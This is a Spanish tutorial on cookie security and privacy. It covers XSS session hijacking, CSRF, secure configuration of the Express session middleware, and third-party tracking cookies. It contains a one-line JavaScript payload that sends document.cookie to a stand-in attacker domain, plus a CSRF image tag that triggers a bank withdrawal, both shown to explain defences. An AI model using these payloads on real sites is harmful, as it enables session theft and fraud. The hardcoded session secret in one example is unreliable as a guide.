# Cookies - Seguridad, Seguimiento y Privacidad

## Seguridad

### Secuestro de Sesión y XSS

Las cookies se usan a menudo para identificar un usuario y su sesión autenticada. Por lo tanto, robar una cookie de una aplicación web puede permitir el secuestro de la sesión autenticada del usuario. Las maneras más comunes de robar cookies incluyen *Ingeniería Social* o aprovecharse de una vulnerabilidad XSS en la aplicación.

```
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```
El atributo ***HttpOnly*** en una cookie puede ayudar a mitigar este ataque al prevenir el acceso al valor de la cookie mediante JavaScript.

### Cross-site Request Forgery (CSRF)

El siguiente es un ejemplo de CSRF. En esta situación, alguien incluye una imagen que en realidad no es una imagen, en su lugar es una petición al servidor de tu banco para retirar dinero:

```
<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
```

Ahora, si has iniciado sesión en tu banco y tus cookies son todavía válidas (y no hay ninguna otra validación), transferirás dinero cuando cargues el HTML con la imagen. Hay algunas técnicas para prevenirlo:

 * Como XSS, el filtro de entrada (input filtering) es importante.
 * Siempre debe haber una confirmación requerida para cualquier acción sensible.
 * Las cookies usadas para acciones sensibles deben tener un tiempo corto de vida.

## Utilizar las cookies de forma segura

Para garantizar que las cookies no abran la aplicación para ataques, no utilice el nombre de cookie de sesión predeterminado y establezca las opciones de seguridad de las cookies correctamente.

Hay dos módulos de sesión de cookies de middleware principales:

 * ***express-session***, que sustituye el middleware express.session incorporado en Express 3.x.
 * ***cookie-session***, que sustituye el middleware express.cookieSession incorporado en Express 3.x.

La principal diferencia entre los dos módulos es cómo guardan los datos de sesión de las cookies. El middleware ***express-session*** almacena los datos de sesión en el servidor; sólo guarda el ID de sesión en la propia cookie, no los datos de sesión. De forma predeterminada, utiliza el almacenamiento en memoria y no está diseñado para un entorno de producción. En la producción, deberá configurar un almacenamiento de sesión escalable; consulte la lista de almacenes de sesión compatibles.

Por su parte, el middleware ***cookie-session*** implementa un almacenamiento basado en cookies: serializa la sesión completa en la cookie, en lugar de sólo una clave de sesión. Utilícelo sólo cuando los datos de sesión sean relativamente pequeños y fácilmente codificables como valores primitivos (en lugar de objetos). Aunque se supone que los navegadores pueden dar soporte a 4096 bytes por cookie como mínimo, para no exceder el límite, no supere un tamaño de 4093 bytes por dominio. Asimismo, asegúrese de que los datos de la cookie estén visibles para el cliente, para que si se deben proteger u ocultar por cualquier motivo, se utilice mejor la opción express-session.

### No utilizar el nombre de cookie de sesión predeterminado

Si utiliza el nombre de cookie de sesión predeterminado, la aplicación puede quedar abierta a los ataques. El problema de seguridad que supone es similar a **X-Powered-By**: un posible atacante puede utilizarlo para firmar digitalmente el servidor y dirigir los ataques en consecuencia.

Para evitar este problema, utilice nombres de cookie genéricos, por ejemplo, con el middleware express-session:

```var session = require('express-session');
app.set('trust proxy', 1) // trust first proxy
app.use( session({
   secret : 's3Cur3',
   name : 'sessionId',
  })
);
```

### Establecer las opciones de seguridad de las cookies
Establezca las siguientes opciones de cookies para mejorar la seguridad:

 * ***secure*** - Garantiza que el navegador sólo envíe la cookie a través de HTTPS.
 * ***httpOnly*** - Garantiza que la cookie sólo se envíe a través de HTTP(S), no a través de JavaScript de cliente, para la protección contra ataques de scripts entre sitios.
 * ***domain*** - Indica el dominio de la cookie; utilícelo para compararlo con el dominio del servidor donde se está solicitando el URL. Si coinciden, compruebe el atributo de vía de acceso a continuación.
 * ***path*** - Indica la vía de acceso de la cookie; utilícela para compararla con la vía de acceso de la solicitud. Si esta y el dominio coinciden, envíe la cookie en la solicitud.
 * ***expires*** - Se utiliza para establecer la fecha de caducidad de las cookies persistentes.
A continuación, se muestra un ejemplo de uso del middleware cookie-session:

```var session = require('cookie-session');
var express = require('express');
var app = express();

var expiryDate = new Date( Date.now() + 60 * 60 * 1000 ); // 1 hour
app.use(session({
  name: 'session',
  keys: ['key1', 'key2'],
  cookie: { secure: true,
            httpOnly: true,
            domain: 'example.com',
            path: 'foo/bar',
            expires: expiryDate
          }
  })
);
```

## Seguimiento y Privacidad

Las cookies tienen un dominio asociado a cada una. Si este dominio es el mismo que el dominio de la página en la que te encuentras, la cookie se denomina ***first-party***. Si el dominio no coincide se denomina ***third-party***. Mientras las **first-party cookies** se mandan solamente al servidor que las crea, una página puede contener imágenes u otros componentes almacenados en servidores de otros dominios. Las cookies se mandan a través de estos terceros se usan principalmente para publicidad y seguimiento a través a de la red.

### Do-Not-Track

No hay requerimientos legales o tecnológicos para su uso, pero el encabezado DNT puede ser usado para indicar a la página que debe deshabilitar su seguimiento o su seguimiento de usuario a través de sitios para un usuario individual.

### Zombie cookies and Evercookies
Una aproximación más radical a las cookies son las cookies **zombie** o **Evercookies**, que son recreadas después de ser borradas y son intencionalmente difíciles de borrar para siempre. Usan la API de almacenamiento web, objetos locales compartidos Flash y otras técnicas para recrearse cuando detecten la ausencia la cookie.

